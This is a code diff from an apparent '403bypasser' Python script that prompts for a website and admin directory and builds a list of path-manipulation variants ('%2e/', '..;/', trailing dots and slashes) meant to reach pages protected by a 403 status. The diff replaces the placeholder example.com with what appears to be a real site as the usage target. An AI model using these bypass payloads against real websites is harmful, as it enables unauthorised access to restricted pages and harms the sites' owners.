@@ -5,7 +5,7 @@ print("------------------------------------- 403bypasser -----------------------
 print("My is to bypass 403 status code and to reach restricted pages.\n"
       "HTTP status codes are detected by both GET and HEAD requests.\n")
 
-website = input('Usage : https://www.example.com : ')
+website = input('Usage : https://www.7seasnft.com : ')
 print("Leave blank if there is no admin directory.")
 directory = input('Usage : admin :')
 url = [directory,'%2e/'+directory,directory+'/.',directory+'//','./'+directory+'/./',directory+'/',directory+'..;/']
